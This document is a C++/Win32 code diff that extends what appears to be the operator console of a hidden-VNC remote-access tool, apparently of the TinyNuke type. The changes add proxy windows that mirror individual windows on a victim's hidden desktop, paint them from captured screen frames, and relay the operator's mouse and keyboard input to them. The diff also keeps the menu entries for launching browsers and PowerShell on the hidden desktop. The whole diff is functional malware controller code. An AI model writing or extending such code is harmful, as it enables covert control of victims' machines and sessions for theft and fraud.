@@ -13,6 +13,16 @@ struct InputMessage
    DWORD lParam;
 };
 
+struct Client;
+
+struct ProxyWindowSlot
+{
+   HWND hWnd;
+   unsigned long long hiddenHwnd;
+   WINDOW_PROXY_ENTRY entry;
+   Client *client;
+};
+
 struct Client
 {
    SOCKET connections[Connection::end];
@@ -31,6 +41,7 @@ struct Client
    WINDOW_PROXY_ENTRY proxyWindows[winproxy::MAX_WINDOWS];
    DWORD  proxyWindowCount;
    DWORD  proxySequence;
+   ProxyWindowSlot proxySlots[winproxy::MAX_WINDOWS];
 };
 
 static const COLORREF gc_trans              = RGB(255, 174, 201);
@@ -41,6 +52,7 @@ static const DWORD    gc_socketTimeoutMs    = 5000;
 
 static const DWORD    gc_minWindowWidth  = 800;
 static const DWORD    gc_minWindowHeight = 600;
+static const UINT     gc_proxySyncMsg = WM_APP + 0x240;
 
 
 enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
@@ -48,6 +60,7 @@ enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, sta
 static Client           g_clients[gc_maxClients];
 static DWORD            g_nextSessionId = 1;
 static CRITICAL_SECTION g_critSec;
+static const WCHAR     *g_proxyClassName = L"HHHHProxyX64";
 
 static const TCHAR *ConnectionName(int connection)
 {
@@ -256,7 +269,10 @@ static void UpdateClientWindowProxySnapshot(Client *client, const WINDOW_PROXY_H
    }
 
    if(client->hWnd)
+   {
       InvalidateRgn(client->hWnd, NULL, FALSE);
+      PostMessage(client->hWnd, gc_proxySyncMsg, header->sequence, 0);
+   }
 }
 
 static void DrawWindowProxyOverlay(HDC hDc, Client *client)
@@ -319,6 +335,20 @@ static BOOL SendInputMessage(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
    return SendAll(s, &input, (int) sizeof(input));
 }
 
+static BOOL SendProxyInputMessage(SOCKET s, const WINDOW_PROXY_INPUT *proxyInput)
+{
+   if(!proxyInput)
+      return FALSE;
+
+   InputMessage prefix;
+   prefix.msg = winproxy::INPUT_MESSAGE_MARK;
+   prefix.wParam = sizeof(WINDOW_PROXY_INPUT);
+   prefix.lParam = winproxy::PROTOCOL_VERSION;
+
+   return SendAll(s, &prefix, (int) sizeof(prefix)) &&
+      SendAll(s, proxyInput, (int) sizeof(*proxyInput));
+}
+
 static const TCHAR *InputMsgName(UINT msg)
 {
    switch(msg)
@@ -374,6 +404,355 @@ static void SendClientInput(Client *client, UINT msg, WPARAM wParam, LPARAM lPar
 
    if(!sent && hWnd)
       PostMessage(hWnd, WM_CLOSE, 0, 0);
+}
+
+static void SendClientProxyInput(Client *client, const WINDOW_PROXY_ENTRY& entry, HWND proxyHwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+   SOCKET inputSocket = INVALID_SOCKET;
+   HWND controlHwnd = NULL;
+   EnterCriticalSection(&g_critSec);
+   if(client && client->connections[Connection::input])
+   {
+      inputSocket = client->connections[Connection::input];
+      controlHwnd = client->hWnd;
+   }
+   LeaveCriticalSection(&g_critSec);
+
+   if(inputSocket == INVALID_SOCKET)
+      return;
+
+   POINT clientPoint = { 0, 0 };
+   if(msg == WM_MOUSEWHEEL)
+   {
+      clientPoint.x = GET_X_LPARAM(lParam);
+      clientPoint.y = GET_Y_LPARAM(lParam);
+      ScreenToClient(proxyHwnd, &clientPoint);
+   }
+   else
+   {
+      clientPoint.x = GET_X_LPARAM(lParam);
+      clientPoint.y = GET_Y_LPARAM(lParam);
+   }
+
+   RECT proxyClientRect = { 0 };
+   GetClientRect(proxyHwnd, &proxyClientRect);
+   LONG proxyWidth = proxyClientRect.right - proxyClientRect.left;
+   LONG proxyHeight = proxyClientRect.bottom - proxyClientRect.top;
+   LONG remoteWidth = entry.right - entry.left;
+   LONG remoteHeight = entry.bottom - entry.top;
+   if(proxyWidth <= 0 || proxyHeight <= 0 || remoteWidth <= 0 || remoteHeight <= 0)
+      return;
+
+   LONG remoteX = entry.left + (LONG)((double) clientPoint.x * remoteWidth / proxyWidth);
+   LONG remoteY = entry.top + (LONG)((double) clientPoint.y * remoteHeight / proxyHeight);
+
+   WINDOW_PROXY_INPUT proxyInput = { 0 };
+   proxyInput.version = winproxy::PROTOCOL_VERSION;
+   proxyInput.size = sizeof(proxyInput);
+   proxyInput.msg = msg;
+   proxyInput.flags = (msg >= WM_MOUSEFIRST && msg <= WM_MOUSELAST) ? winproxy::INPUT_FLAG_MOUSE : winproxy::INPUT_FLAG_KEYBOARD;
+   proxyInput.hwnd = entry.hwnd;
+   proxyInput.wParam = (unsigned long long) wParam;
+   proxyInput.lParam = (long long) MAKELPARAM(remoteX, remoteY);
+   proxyInput.screenX = remoteX;
+   proxyInput.screenY = remoteY;
+
+   BOOL sent = SendProxyInputMessage(inputSocket, &proxyInput);
+   if(ShouldLogInput(msg))
+      wprintf(TEXT("[winproxy-input] send %s hidden=0x%I64x proxy=0x%p remote=(%ld,%ld) result=%s\n"),
+         InputMsgName(msg), entry.hwnd, proxyHwnd, remoteX, remoteY, sent ? TEXT("ok") : TEXT("failed"));
+
+   if(!sent && controlHwnd)
+      PostMessage(controlHwnd, WM_CLOSE, 0, 0);
+}
+
+static Client *GetClientByProxyHwnd(HWND hWnd, ProxyWindowSlot **slotOut)
+{
+   Client *result = NULL;
+   if(slotOut)
+      *slotOut = NULL;
+
+   EnterCriticalSection(&g_critSec);
+   for(int i = 0; i < gc_maxClients && !result; ++i)
+   {
+      for(DWORD j = 0; j < winproxy::MAX_WINDOWS; ++j)
+      {
+         if(g_clients[i].proxySlots[j].hWnd == hWnd)
+         {
+            result = &g_clients[i];
+            if(slotOut)
+               *slotOut = &g_clients[i].proxySlots[j];
+            break;
+         }
+      }
+   }
+   LeaveCriticalSection(&g_critSec);
+   return result;
+}
+
+static void InvalidateClientProxyWindows(Client *client)
+{
+   if(!client)
+      return;
+   for(DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+   {
+      if(client->proxySlots[i].hWnd)
+         InvalidateRgn(client->proxySlots[i].hWnd, NULL, FALSE);
+   }
+}
+
+static void DestroyClientProxyWindows(Client *client)
+{
+   if(!client)
+      return;
+   for(DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+   {
+      HWND hWnd = client->proxySlots[i].hWnd;
+      if(hWnd)
+      {
+         client->proxySlots[i].hWnd = NULL;
+         DestroyWindow(hWnd);
+      }
+      memset(&client->proxySlots[i], 0, sizeof(client->proxySlots[i]));
+   }
+}
+
+static ProxyWindowSlot *FindProxySlot(Client *client, unsigned long long hiddenHwnd)
+{
+   if(!client || !hiddenHwnd)
+      return NULL;
+   for(DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+   {
+      if(client->proxySlots[i].hWnd && client->proxySlots[i].hiddenHwnd == hiddenHwnd)
+         return &client->proxySlots[i];
+   }
+   return NULL;
+}
+
+static ProxyWindowSlot *FindFreeProxySlot(Client *client)
+{
+   if(!client)
+      return NULL;
+   for(DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+   {
+      if(!client->proxySlots[i].hWnd && !client->proxySlots[i].hiddenHwnd)
+         return &client->proxySlots[i];
+   }
+   return NULL;
+}
+
+static BOOL HasProxyEntry(const WINDOW_PROXY_ENTRY *entries, DWORD count, unsigned long long hiddenHwnd)
+{
+   for(DWORD i = 0; i < count; ++i)
+   {
+      if(entries[i].hwnd == hiddenHwnd)
+         return TRUE;
+   }
+   return FALSE;
+}
+
+static void PositionProxyWindow(ProxyWindowSlot *slot)
+{
+   if(!slot || !slot->hWnd)
+      return;
+   LONG width = slot->entry.right - slot->entry.left;
+   LONG height = slot->entry.bottom - slot->entry.top;
+   if(width <= 0 || height <= 0)
+      return;
+   SetWindowTextW(slot->hWnd, slot->entry.title[0] ? slot->entry.title : slot->entry.className);
+   SetWindowPos(slot->hWnd,
+      HWND_TOP,
+      slot->entry.left,
+      slot->entry.top,
+      width,
+      height,
+      SWP_NOACTIVATE | SWP_SHOWWINDOW);
+   InvalidateRgn(slot->hWnd, NULL, FALSE);
+}
+
+static void SyncClientProxyWindows(Client *client)
+{
+   if(!client)
+      return;
+
+   WINDOW_PROXY_ENTRY entries[winproxy::MAX_WINDOWS];
+   DWORD count = 0;
+   EnterCriticalSection(&g_critSec);
+   count = client->proxyWindowCount;
+   if(count > winproxy::MAX_WINDOWS)
+      count = winproxy::MAX_WINDOWS;
+   if(count)
+      memcpy(entries, client->proxyWindows, sizeof(WINDOW_PROXY_ENTRY) * count);
+   LeaveCriticalSection(&g_critSec);
+
+   for(DWORD i = 0; i < winproxy::MAX_WINDOWS; ++i)
+   {
+      if(client->proxySlots[i].hWnd && !HasProxyEntry(entries, count, client->proxySlots[i].hiddenHwnd))
+      {
+         HWND oldHwnd = client->proxySlots[i].hWnd;
+         wprintf(TEXT("[winproxy] destroy proxy hwnd=0x%p hidden=0x%I64x\n"), oldHwnd, client->proxySlots[i].hiddenHwnd);
+         client->proxySlots[i].hWnd = NULL;
+         DestroyWindow(oldHwnd);
+         memset(&client->proxySlots[i], 0, sizeof(client->proxySlots[i]));
+      }
+   }
+
+   for(DWORD i = 0; i < count; ++i)
+   {
+      ProxyWindowSlot *slot = FindProxySlot(client, entries[i].hwnd);
+      if(!slot)
+      {
+         slot = FindFreeProxySlot(client);
+         if(!slot)
+            break;
+         memset(slot, 0, sizeof(*slot));
+         slot->client = client;
+         slot->hiddenHwnd = entries[i].hwnd;
+         slot->entry = entries[i];
+         LONG width = entries[i].right - entries[i].left;
+         LONG height = entries[i].bottom - entries[i].top;
+         slot->hWnd = CreateWindowExW(WS_EX_APPWINDOW,
+            g_proxyClassName,
+            entries[i].title[0] ? entries[i].title : entries[i].className,
+            WS_POPUP | WS_VISIBLE,
+            entries[i].left,
+            entries[i].top,
+            width > 0 ? width : 100,
+            height > 0 ? height : 100,
+            NULL,
+            NULL,
+            GetModuleHandle(NULL),
+            slot);
+         if(slot->hWnd)
+            wprintf(TEXT("[winproxy] create proxy hwnd=0x%p hidden=0x%I64x pid=%lu class='%ls' title='%ls'\n"), slot->hWnd, slot->hiddenHwnd, entries[i].pid, entries[i].className, entries[i].title);
+         else
+         {
+            wprintf(TEXT("[winproxy] create proxy failed hidden=0x%I64x GetLastError=%lu\n"), entries[i].hwnd, GetLastError());
+            memset(slot, 0, sizeof(*slot));
+            continue;
+         }
+      }
+      else
+      {
+         slot->entry = entries[i];
+      }
+      PositionProxyWindow(slot);
+   }
+}
+
+static LRESULT CALLBACK ProxyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+   ProxyWindowSlot *slot = (ProxyWindowSlot *) GetWindowLongPtr(hWnd, GWLP_USERDATA);
+   if(msg == WM_NCCREATE)
+   {
+      CREATESTRUCT *cs = (CREATESTRUCT *) lParam;
+      slot = (ProxyWindowSlot *) cs->lpCreateParams;
+      SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR) slot);
+      return TRUE;
+   }
+
+   switch(msg)
+   {
+      case WM_PAINT:
+      {
+         PAINTSTRUCT ps;
+         HDC hDc = BeginPaint(hWnd, &ps);
+         RECT clientRect;
+         GetClientRect(hWnd, &clientRect);
+         HBRUSH brush = CreateSolidBrush(RGB(0, 0, 0));
+         FillRect(hDc, &clientRect, brush);
+         DeleteObject(brush);
+
+         Client *client = slot ? slot->client : NULL;
+         if(client)
+         {
+            EnterCriticalSection(&g_critSec);
+            if(client->hDcBmp && client->screenWidth && client->screenHeight && client->pixelsWidth && client->pixelsHeight)
+            {
+               int srcX = (int)((double) slot->entry.left * client->pixelsWidth / client->screenWidth);
+               int srcY = (int)((double) slot->entry.top * client->pixelsHeight / client->screenHeight);
+               int srcW = (int)((double) (slot->entry.right - slot->entry.left) * client->pixelsWidth / client->screenWidth);
+               int srcH = (int)((double) (slot->entry.bottom - slot->entry.top) * client->pixelsHeight / client->screenHeight);
+               StretchBlt(hDc, 0, 0, clientRect.right - clientRect.left, clientRect.bottom - clientRect.top,
+                  client->hDcBmp, srcX, srcY, srcW, srcH, SRCCOPY);
+            }
+            LeaveCriticalSection(&g_critSec);
+         }
+
+         EndPaint(hWnd, &ps);
+         return 0;
+      }
+      case WM_ERASEBKGND:
+         return TRUE;
+      case WM_SETFOCUS:
+      case WM_ACTIVATE:
+         return DefWindowProc(hWnd, msg, wParam, lParam);
+      case WM_LBUTTONDOWN:
+      case WM_RBUTTONDOWN:
+      case WM_MBUTTONDOWN:
+         SetFocus(hWnd);
+         SetCapture(hWnd);
+         if(slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, msg, wParam, lParam);
+         return 0;
+      case WM_LBUTTONUP:
+      case WM_RBUTTONUP:
+      case WM_MBUTTONUP:
+         ReleaseCapture();
+         if(slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, msg, wParam, lParam);
+         return 0;
+      case WM_LBUTTONDBLCLK:
+      case WM_RBUTTONDBLCLK:
+      case WM_MBUTTONDBLCLK:
+      case WM_MOUSEWHEEL:
+         if(slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, msg, wParam, lParam);
+         return 0;
+      case WM_MOUSEMOVE:
+         if((wParam & (MK_LBUTTON | MK_RBUTTON | MK_MBUTTON)) && slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, msg, wParam, lParam);
+         return 0;
+      case WM_CHAR:
+      case WM_SYSCHAR:
+         if(!iscntrl(wParam) && slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, msg, wParam, lParam);
+         return 0;
+      case WM_KEYDOWN:
+      case WM_KEYUP:
+      case WM_SYSKEYDOWN:
+      case WM_SYSKEYUP:
+         if(slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, msg, wParam, lParam);
+         return 0;
+      case WM_CLOSE:
+         if(slot)
+            SendClientProxyInput(slot->client, slot->entry, hWnd, WM_LBUTTONUP, 0, MAKELPARAM(0, 0));
+         DestroyWindow(hWnd);
+         return 0;
+      case WM_NCDESTROY:
+         SetWindowLongPtr(hWnd, GWLP_USERDATA, 0);
+         return DefWindowProc(hWnd, msg, wParam, lParam);
+      default:
+         return DefWindowProc(hWnd, msg, wParam, lParam);
+   }
+}
+
+static BOOL RegisterProxyWindowClass()
+{
+   WNDCLASSEXW wc = { 0 };
+   wc.cbSize = sizeof(wc);
+   wc.style = CS_DBLCLKS;
+   wc.lpfnWndProc = ProxyWndProc;
+   wc.hInstance = GetModuleHandle(NULL);
+   wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+   wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+   wc.hbrBackground = (HBRUSH) GetStockObject(BLACK_BRUSH);
+   wc.lpszClassName = g_proxyClassName;
+   wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
+   if(RegisterClassExW(&wc))
+      return TRUE;
+   return GetLastError() == ERROR_CLASS_ALREADY_EXISTS;
 }
 
 static void ToggleFullscreen(HWND hWnd, Client *client)
@@ -487,8 +866,16 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          EndPaint(hWnd, &ps);
          break;
       }
+      case gc_proxySyncMsg:
+      {
+         if(client)
+            SyncClientProxyWindows(client);
+         break;
+      }
       case WM_DESTROY:
       {
+         if(client)
+            DestroyClientProxyWindows(client);
          PostQuitMessage(0);
          break;
       }
@@ -757,6 +1144,7 @@ static DWORD WINAPI ClientThread(PVOID param)
             free(oldPixels);
 
             InvalidateRgn(client->hWnd, NULL, TRUE);
+            InvalidateClientProxyWindows(client);
 
 frame_cleanup:
             DeleteClientBitmap(hDcBmp, hBmp, hOldBmp);
@@ -886,6 +1274,7 @@ exit:
       EnterCriticalSection(&g_critSec);
       {
          wprintf(TEXT("[!] Client %hs Disconnected\n"), ip);
+         DestroyClientProxyWindows(client);
          free(client->pixels);
          DeleteClientBitmap(client->hDcBmp, client->hBmp, client->hOldBmp);
          closesocket(client->connections[Connection::input]);
@@ -922,6 +1311,14 @@ BOOL StartServer(int port)
          wprintf(TEXT("[!] Control window class registration failed: GetLastError=%lu\n"), err);
          return FALSE;
       }
+   }
+
+   if(RegisterProxyWindowClass())
+      wprintf(TEXT("[diag] Proxy window class registered\n"));
+   else
+   {
+      wprintf(TEXT("[!] Proxy window class registration failed: GetLastError=%lu\n"), GetLastError());
+      return FALSE;
    }
 
    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
